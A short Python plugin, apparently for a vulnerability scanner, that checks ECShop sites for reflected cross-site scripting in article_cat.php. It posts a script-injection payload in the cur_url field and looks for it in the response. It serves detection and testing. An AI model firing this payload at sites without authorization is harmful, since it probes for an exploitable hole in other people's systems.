#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = 'xfkxfk'

def assign(service, arg):
    if service == "ecshop":
        return True, arg

def audit(arg):
    url = arg
    url = url + 'article_cat.php?id=1'
    
    post_data = 'keywords=123456&id=1&cur_url=' + url + '\\\"><script>alert(123456)</script>'
    code, head, body, _, _ = curl.curl("-d \"%s\" %s" %(post_data,url))
    if code == 200:
        if body and body.find('<script>alert(123456)</script>') != -1:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('ecshop', 'http://www.example.com/')[1])
